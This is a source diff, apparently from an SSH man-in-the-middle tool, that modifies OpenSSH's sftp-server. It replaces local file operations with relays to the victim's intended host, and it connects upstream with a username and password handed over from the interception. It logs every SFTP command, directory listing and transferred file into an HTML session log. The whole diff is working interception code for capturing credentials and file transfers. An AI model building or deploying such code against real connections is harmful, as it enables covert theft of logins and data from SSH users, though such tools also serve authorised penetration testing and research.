 			status = SSH2_FX_OK;
 	}
+	*/
+	status = mitm_do_rename(client_conn, oldpath, newpath, 1);
 	send_status(id, status);
+
+	sftp_log(status, "rename \"%s\" \"%s\"", oldpath, newpath);
 	free(oldpath);
 	free(newpath);
 }
@@ -1232,15 +1744,18 @@ process_rename(u_int32_t id)
 static void
 process_readlink(u_int32_t id)
 {
-	int r, len;
-	char buf[PATH_MAX];
+	int r;
 	char *path;
+	u_int status = 0;
+	char *filename = NULL, *long_name = NULL;
+	Attrib a;
 
 	if ((r = sshbuf_get_cstring(iqueue, &path, NULL)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 
 	debug3("request %u: readlink", id);
 	verbose("readlink \"%s\"", path);
+	/*
 	if ((len = readlink(path, buf, sizeof(buf) - 1)) == -1)
 		send_status(id, errno_to_portable(errno));
 	else {
@@ -1251,6 +1766,19 @@ process_readlink(u_int32_t id)
 		s.name = s.long_name = buf;
 		send_names(id, 1, &s);
 	}
+	*/
+	if (mitm_do_readlink(client_conn, path, &status, &filename, &long_name, &a) == 1) {
+		Stat s;
+		s.name = filename;
+		s.long_name = long_name;
+		s.attrib = a;
+		send_names(id, 1, &s);
+	} else
+		send_status(id, status);
+
+	sftp_log_attrib("readlink", status, path, &a);
+	free(filename); filename = NULL;
+	free(long_name); long_name = NULL;
 	free(path);
 }
 
@@ -1267,9 +1795,14 @@ process_symlink(u_int32_t id)
 	debug3("request %u: symlink", id);
 	logit("symlink old \"%s\" new \"%s\"", oldpath, newpath);
 	/* this will fail if 'newpath' exists */
+	/*
 	r = symlink(oldpath, newpath);
 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
+	*/
+	status = mitm_do_symlink(client_conn, oldpath, newpath);
 	send_status(id, status);
+
+	sftp_log(status, "ln -s \"%s\" \"%s\"", oldpath, newpath);
 	free(oldpath);
 	free(newpath);
 }
@@ -1286,9 +1819,14 @@ process_extended_posix_rename(u_int32_t id)
 
 	debug3("request %u: posix-rename", id);
 	logit("posix-rename old \"%s\" new \"%s\"", oldpath, newpath);
+	/*
 	r = rename(oldpath, newpath);
 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
+	*/
+	status = mitm_do_rename(client_conn, oldpath, newpath, 0);
 	send_status(id, status);
+
+	sftp_log(status, "posix_rename \"%s\" \"%s\"", oldpath, newpath);
 	free(oldpath);
 	free(newpath);
 }
@@ -1299,29 +1837,41 @@ process_extended_statvfs(u_int32_t id)
 	char *path;
 	struct statvfs st;
 	int r;
+	u_int status = 0;
 
 	if ((r = sshbuf_get_cstring(iqueue, &path, NULL)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 	debug3("request %u: statvfs", id);
 	logit("statvfs \"%s\"", path);
 
+	/*
 	if (statvfs(path, &st) != 0)
 		send_status(id, errno_to_portable(errno));
 	else
 		send_statvfs(id, &st);
+	*/
+	if (mitm_do_statvfs(client_conn, path, &st, &status) != -1)
+		send_statvfs(id, &st);
+	else
+		send_status(id, status);
+
+	sftp_log_statvfs(status, path, &st);
         free(path);
 }
 
 static void
 process_extended_fstatvfs(u_int32_t id)
 {
-	int r, handle, fd;
+	int r, handle_int;
 	struct statvfs st;
+	u_int status = 0;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
 
+	/*
 	if ((r = get_handle(iqueue, &handle)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
-	debug("request %u: fstatvfs \"%s\" (handle %u)",
-	    id, handle_to_name(handle), handle);
+
 	if ((fd = handle_to_fd(handle)) < 0) {
 		send_status(id, SSH2_FX_FAILURE);
 		return;
@@ -1330,6 +1880,19 @@ process_extended_fstatvfs(u_int32_t id)
 		send_status(id, errno_to_portable(errno));
 	else
 		send_statvfs(id, &st);
+	*/
+
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	debug3("request %u: fstatvfs (handle %u)", id, handle_int);
+	if (mitm_do_fstatvfs(client_conn, handle_str, handle_len, &st, &status) != -1)
+		send_statvfs(id, &st);
+	else
+		send_status(id, status);
+
+	sftp_log_fstatvfs(status, handle_str, handle_len, &st);
+	free(handle_str); handle_str = NULL;
 }
 
 static void
@@ -1344,9 +1907,14 @@ process_extended_hardlink(u_int32_t id)
 
 	debug3("request %u: hardlink", id);
 	logit("hardlink old \"%s\" new \"%s\"", oldpath, newpath);
+	/*
 	r = link(oldpath, newpath);
 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
+	*/
+	status = mitm_do_hardlink(client_conn, oldpath, newpath);
 	send_status(id, status);
+
+	sftp_log(status, "ln \"%s\" \"%s\"", oldpath, newpath);
 	free(oldpath);
 	free(newpath);
 }
@@ -1354,19 +1922,31 @@ process_extended_hardlink(u_int32_t id)
 static void
 process_extended_fsync(u_int32_t id)
 {
-	int handle, fd, r, status = SSH2_FX_OP_UNSUPPORTED;
+	int handle_int, r, status = SSH2_FX_OP_UNSUPPORTED;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
 
+	/*
 	if ((r = get_handle(iqueue, &handle)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
-	debug3("request %u: fsync (handle %u)", id, handle);
-	verbose("fsync \"%s\"", handle_to_name(handle));
+	*/
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	debug3("request %u: fsync (handle %u)", id, handle_int);
+	/*
 	if ((fd = handle_to_fd(handle)) < 0)
 		status = SSH2_FX_NO_SUCH_FILE;
 	else if (handle_is_ok(handle, HANDLE_FILE)) {
 		r = fsync(fd);
 		status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
 	}
+	*/
+	status = mitm_do_fsync(client_conn, handle_str, handle_len);
 	send_status(id, status);
+
+	sftp_log_fsync(status, handle_str, handle_len);
+	free(handle_str); handle_str = NULL;
 }
 
 static void
@@ -1474,6 +2054,10 @@ process(void)
 void
 sftp_server_cleanup_exit(int i)
 {
+	write(session_log_fd, "</pre></html>", 13);
+	fdatasync(session_log_fd);
+	close(session_log_fd);
+
 	if (pw != NULL && client_addr != NULL) {
 		handle_log_exit();
 		logit("session closed for local user %s from [%s]",
@@ -1485,19 +2069,17 @@ sftp_server_cleanup_exit(int i)
 static void
 sftp_server_usage(void)
 {
-	extern char *__progname;
-
 	fprintf(stderr,
 	    "usage: %s [-ehR] [-d start_directory] [-f log_facility] "
 	    "[-l log_level]\n\t[-P blacklisted_requests] "
 	    "[-p whitelisted_requests] [-u umask]\n"
 	    "       %s -Q protocol_feature\n",
-	    __progname, __progname);
+	    "/usr/libexec/sftp-server", "/usr/libexec/sftp-server");
 	exit(1);
 }
 
 int
-sftp_server_main(int argc, char **argv, struct passwd *user_pw)
+sftp_server_main(int argc, char **argv, struct passwd *user_pw, char *original_host, unsigned short original_port, char *username, char *password_and_fingerprint_socket_name, char *log_filepath, char *log_dir)
 {
 	fd_set *rset, *wset;
 	int i, r, in, out, max, ch, skipargs = 0, log_stderr = 0;
@@ -1553,10 +2135,12 @@ sftp_server_main(int argc, char **argv, struct passwd *user_pw)
 				error("Invalid log facility \"%s\"", optarg);
 			break;
 		case 'd':
+			/*
 			cp = tilde_expand_filename(optarg, user_pw->pw_uid);
 			homedir = percent_expand(cp, "d", user_pw->pw_dir,
 			    "u", user_pw->pw_name, (char *)NULL);
 			free(cp);
+			*/
 			break;
 		case 'p':
 			if (request_whitelist != NULL)
@@ -1583,6 +2167,7 @@ sftp_server_main(int argc, char **argv, struct passwd *user_pw)
 	}
 
 	log_init(__progname, log_level, log_facility, log_stderr);
+	mitm_init_log(log_filepath, log_dir);
 
 	/*
 	 * On platforms where we can, avoid making /proc/self/{mem,maps}
@@ -1638,6 +2223,7 @@ sftp_server_main(int argc, char **argv, struct passwd *user_pw)
 		}
 	}
 
+	client_conn = make_connection(original_host, original_port, username, password_and_fingerprint_socket_name);
 	set_size = howmany(max + 1, NFDBITS) * sizeof(fd_mask);
 	for (;;) {
 		memset(rset, 0, set_size);
@@ -1705,4 +2291,341 @@ sftp_server_main(int argc, char **argv, struct passwd *user_pw)
 			fatal("%s: sshbuf_check_reserve: %s",
 			    __func__, ssh_err(r));
 	}
+}
+
+/* Copied from sftp.c. */
+/* ARGSUSED */
+static void
+killchild(int signo)
+{
+	if (sshpid > 1) {
+		kill(sshpid, SIGTERM);
+		waitpid(sshpid, NULL, 0);
+	}
+
+	_exit(1);
+}
+
+/* Copied from sftp.c. */
+/* ARGSUSED */
+static void
+suspchild(int signo)
+{
+	if (sshpid > 1) {
+		kill(sshpid, signo);
+		while (waitpid(sshpid, NULL, WUNTRACED) == -1 && errno == EINTR)
+			continue;
+	}
+	kill(getpid(), SIGSTOP);
+}
+
+/* Copied from sftp.c. */
+static void
+connect_to_server(char *path, char **args, int *in, int *out)
+{
+	int c_in, c_out;
+
+#ifdef USE_PIPES
+	int pin[2], pout[2];
+
+	if ((pipe(pin) == -1) || (pipe(pout) == -1))
+		fatal("pipe: %s", strerror(errno));
+	*in = pin[0];
+	*out = pout[1];
+	c_in = pout[0];
+	c_out = pin[1];
+#else /* USE_PIPES */
+	int inout[2];
+
+	if (socketpair(AF_UNIX, SOCK_STREAM, 0, inout) == -1)
+		fatal("socketpair: %s", strerror(errno));
+	*in = *out = inout[0];
+	c_in = c_out = inout[1];
+#endif /* USE_PIPES */
+
+	if ((sshpid = fork()) == -1)
+		fatal("fork: %s", strerror(errno));
+	else if (sshpid == 0) {
+		if ((dup2(c_in, STDIN_FILENO) == -1) ||
+		    (dup2(c_out, STDOUT_FILENO) == -1)) {
+			fprintf(stderr, "dup2: %s\n", strerror(errno));
+			_exit(1);
+		}
+		close(*in);
+		close(*out);
+		close(c_in);
+		close(c_out);
+
+		/*
+		 * The underlying ssh is in the same process group, so we must
+		 * ignore SIGINT if we want to gracefully abort commands,
+		 * otherwise the signal will make it to the ssh process and
+		 * kill it too.  Contrawise, since sftp sends SIGTERMs to the
+		 * underlying ssh, it must *not* ignore that signal.
+		 */
+		signal(SIGINT, SIG_IGN);
+		signal(SIGTERM, SIG_DFL);
+
+		execvp(path, args);
+		fprintf(stderr, "exec: %s: %s\n", path, strerror(errno));
+		_exit(1);
+	}
+
+	signal(SIGTERM, killchild);
+	signal(SIGINT, killchild);
+	signal(SIGHUP, killchild);
+	signal(SIGTSTP, suspchild);
+	signal(SIGTTIN, suspchild);
+	signal(SIGTTOU, suspchild);
+	close(c_in);
+	close(c_out);
+}
+
+void mitm_init_log(char *log_filepath, char *log_dir) {
+  session_log_fd = open(log_filepath, O_NOATIME | O_NOFOLLOW | O_WRONLY
+#ifdef SYNC_LOG
+        | O_SYNC
+#endif
+        );
+
+  /* Ensure that writes append to the log, since its initialized with
+   * connection information. */
+  lseek(session_log_fd, 0, SEEK_END);
+
+  if (session_log_fd < 0)
+    logit("MITM: failed to open SFTP log: %s", log_filepath);
+
+  session_log_dir = strdup(log_dir);
+  if ((session_log_dir = xstrdup(log_dir)) == NULL)
+    fatal("Failed to allocate memory for session log dir path.");
+}
+
+struct sftp_conn *
+make_connection(char *host, unsigned short port, char *username, char *password_and_fingerprint_socket_name) {
+	arglist args;
+	char *ssh_program = MITM_SSH_CLIENT;
+	int in = -1, out = -1;
+
+	args.list = NULL;
+	addargs(&args, "%s", ssh_program);
+	addargs(&args, "-E");
+	addargs(&args, "%s", MITM_SSH_CLIENT_LOG);
+	addargs(&args, "-F");
+	addargs(&args, "%s", MITM_SSH_CLIENT_CONFIG);
+	addargs(&args, "-Z");
+	addargs(&args, "%s", password_and_fingerprint_socket_name);
+	addargs(&args, "-oForwardX11=no");
+	addargs(&args, "-oForwardAgent=no");
+	addargs(&args, "-oPermitLocalCommand=no");
+	addargs(&args, "-oClearAllForwardings=yes");
+	addargs(&args, "-oPort=%u", port);
+	addargs(&args, "-oProtocol=2");
+	addargs(&args, "-s");
+	addargs(&args, "--");
+	addargs(&args, "%s@%s", username, host);
+	addargs(&args, "sftp");
+	connect_to_server(ssh_program, args.list, &in, &out);
+	return do_init(in, out, 32768, 64, 0);
+}
+
+/* Simple XSS sanitization. */
+void xss_sanitize(char *buf, int buf_len) {
+  int i;
+  for (i = 0; i < buf_len; i++) {
+    if (buf[i] == '<')
+      buf[i] = '[';
+    else if (buf[i] == '>')
+      buf[i] = ']';
+  }
+}
+
+/* C doesn't let you pass variable-length arguments from one function to
+ * another if the second function needs to call va_start() again.  These
+ * defines cut down on duplicate code in that case.  Not sure if there's any
+ * other way to do it... */
+#define SFTP_LOG_HEADER() va_start(args, fmt); \
+\
+  /* By setting the last byte to NULL and giving sizeof(buf) - 1 to vsnprintf, \
+   * we can be sure that the buffer will be NULL-terminated afterwards. */ \
+  buf[sizeof(buf) - 1] = '\0'; \
+\
+  ret = vsnprintf(buf, buf_len - 1, fmt, args); \
+\
+  /* If we need a larger buffer to format the string into... */ \
+  if (ret >= buf_len) { \
+    buf_len = ret + 1; \
+    if ((buf = reallocarray(NULL, buf_len, sizeof(char))) == NULL) \
+      fatal("Could not allocate buffer for sftp_log."); \
+    buf[buf_len - 1] = '\0'; \
+\
+    va_end(args); \
+    va_start(args, fmt); \
+    ret = vsnprintf(buf, buf_len, fmt, args); \
+  }
+
+#define SFTP_LOG_FOOTER() va_end(args); \
+  /* Free the buffer, if we allocated it. */ \
+  if (buf != buf_stack) { \
+    free(buf); buf = NULL; \
+  }
+
+/* Log an SFTP command. */
+void sftp_log(u_int status, const char *fmt, ...) {
+  char buf_stack[512], *buf = buf_stack;
+  int buf_len = sizeof(buf_stack), ret = 0;
+  va_list args;
+
+  SFTP_LOG_HEADER()
+  _sftp_log(status, 1, buf, ret);
+  SFTP_LOG_FOOTER()
+}
+
+/* Log an SFTP command without XSS filtering enabled.  Don't use this unless
+ * you know what you're doing. */
+void sftp_log_no_filter(u_int status, const char *fmt, ...) {
+  char buf_stack[512], *buf = buf_stack;
+  int buf_len = sizeof(buf_stack), ret = 0;
+  va_list args;
+
+  SFTP_LOG_HEADER()
+  _sftp_log(status, 0, buf, ret);
+  SFTP_LOG_FOOTER()
+}
+
+void _sftp_log(u_int status, u_int do_xss_filtering, char *buf, int buf_len) {
+  write(session_log_fd, "> ", 2);
+
+  /* Replace any angled brackets in the buffer. */
+  if (do_xss_filtering)
+    xss_sanitize(buf, buf_len);
+
+  /* Write the buffer to the session log. */
+  write(session_log_fd, buf, buf_len);
+
+  /* If the status is not success, write it into the log as well. */
+  if (status != SSH2_FX_OK) {
+    char errmsg[64];
+    const char *m = status_to_message(status);
+    int r = 0;
+
+    memset(errmsg, 0, sizeof(errmsg));
+
+    r = snprintf(errmsg, sizeof(errmsg) - 1, " (Error: %s)", m);
+    write(session_log_fd, errmsg, r);
+  }
+
+  write(session_log_fd, "\n", 1);
+}
+
+/* Log a file transfer or directory listing. */
+void sftp_log_close(u_int status, char *handle_str, size_t handle_len) {
+  MITMHandle *mh = NULL;
+
+  if ((mh = mitm_handle_search(handle_str, handle_len)) != NULL) {
+    char *original_path = mh->original_path;
+
+    /* If a file handle was closed... */
+    if (mh->type == MITM_HANDLE_TYPE_FILE) {
+      u_int32_t pflags = mh->pflags;
+      char *actual_path = mh->actual_path;
+      const char get[] = "get";
+      const char put[] = "put";
+      const char getput[] = "get/put";
+      const char *verb = getput;
+      int read = 0, write = 0;
+
+      /* Was the file open for reading, writing, or both? */
+      read = (pflags & SSH2_FXF_READ);
+      write = (pflags & SSH2_FXF_WRITE) || (pflags & SSH2_FXF_APPEND);
+
+      if (read && !write)
+	verb = get;
+      else if (!read && write)
+	verb = put;
+
+      /* Make a link in the log to the local file we saved. */
+      sftp_log_no_filter(status, "%s <a href=\"%s\">%s</a>", verb, actual_path, original_path);
+    } else { /* ...a directory was closed. */
+      sftp_log(status, "ls %s\n%s", original_path, mh->file_listing);
+    }
+  } else
+    logit(CANT_FIND_HANDLE, __func__);
+}
+
+/* Writes an Attrib struct to the log. */
+void sftp_log_attrib(const char *sftp_func, u_int status, char *name, Attrib *a) {
+  if (a != NULL) {
+    status = SSH2_FX_OK;
+    sftp_log(status, "%s \"%s\" (Result: flags: %u; size: %lu; uid: %u; gid: %u; perm: 0%o, atime: %u, mtime: %u)", sftp_func, name, a->flags, a->size, a->uid, a->gid, a->perm, a->atime, a->mtime);
+  } else
+    sftp_log(status, "%s \"%s\" (Result: flags: ?; size: ?; uid: ?; gid: ?; perm: ?, atime: ?, mtime: ?)", sftp_func, name);
+}
+
+/* Given a handle, writes an Attrib struct to the log. */
+void sftp_log_handle_attrib(const char *func, u_int status, char *handle_str, size_t handle_len, Attrib *a) {
+  MITMHandle *mh = NULL;
+
+  if ((mh = mitm_handle_search(handle_str, handle_len)) != NULL)
+    sftp_log_attrib(func, status, mh->original_path, a);
+  else
+    logit(CANT_FIND_HANDLE, __func__);
+}
+
+/* Stores the result of a readdir() call (done during file listings). */
+void sftp_log_readdir(char *handle_str, size_t handle_len, char *listing) {
+  int resize_needed = 0;
+  MITMHandle *mh = NULL;
+
+  if ((mh = mitm_handle_search(handle_str, handle_len)) != NULL) {
+    size_t listing_len = strlen(listing);
+
+    /* If the file listing array hasn't been initialized yet, do that now. */
+    if (mh->file_listing_size == 0) {
+      mh->file_listing_size = MITM_HANDLES_FILE_LISTING_BLOCK;
+      if ((mh->file_listing = reallocarray(NULL, mh->file_listing_size, sizeof(char))) == NULL)
+	fatal("MITM: could not allocate file_listing!");
+      mh->file_listing[0] = '\0';
+    }
+
+    /* If the array isn't big enough, resize it.  (+1 for the newline, and +1
+     * for the NULL byte) */
+    while (mh->file_listing_size < (strlen(mh->file_listing) + listing_len + 1 + 1)) {
+      mh->file_listing_size += MITM_HANDLES_FILE_LISTING_BLOCK;
+      resize_needed = 1;
+    }
+
+    if (resize_needed) {
+      if((mh->file_listing = reallocarray(mh->file_listing, mh->file_listing_size, sizeof(char))) == NULL)
+	fatal("MITM: could not allocate file_listing!");
+    }
+
+    strlcat(mh->file_listing, listing, mh->file_listing_size);
+    strlcat(mh->file_listing, "\n", mh->file_listing_size);
+  } else
+    logit(CANT_FIND_HANDLE, __func__);
+}
+
+/* Writes a statvfs struct to the log. */
+void sftp_log_statvfs(u_int status, char *path, struct statvfs *st) {
+  sftp_log(status, "statvfs \"%s\" (Result: filesystem block size: %lu; fragment size: %lu; filesystem size [measured in fragments]: %lu; number of free blocks: %lu; number of free blocks for unprivileged users: %lu; number of inodes: %lu; number of free inodes: %lu; number of free inodes for unprivileged users: %lu; filesystem ID: %lu; mount flags: %lu; maximum filename length: %lu)", path, st->f_bsize, st->f_frsize, st->f_blocks, st->f_bfree, st->f_bavail, st->f_files, st->f_ffree, st->f_favail, st->f_fsid, st->f_flag, st->f_namemax);
+}
+
+/* Given a file handle, writes a statvfs struct to the log. */
+void sftp_log_fstatvfs(u_int status, char *handle_str, size_t handle_len, struct statvfs *st) {
+  MITMHandle *mh = NULL;
+
+  if ((mh = mitm_handle_search(handle_str, handle_len)) != NULL)
+    sftp_log_statvfs(status, mh->original_path, st);
+  else
+    logit(CANT_FIND_HANDLE, __func__);
+}
+
+/* Logs an fsync() call. */
+void sftp_log_fsync(u_int status, char *handle_str, size_t handle_len) {
+  MITMHandle *mh = NULL;
+
+  if ((mh = mitm_handle_search(handle_str, handle_len)) != NULL)
+    sftp_log(status, "fsync \"%s\"", mh->original_path);
+  else
+    logit(CANT_FIND_HANDLE, __func__);
 }
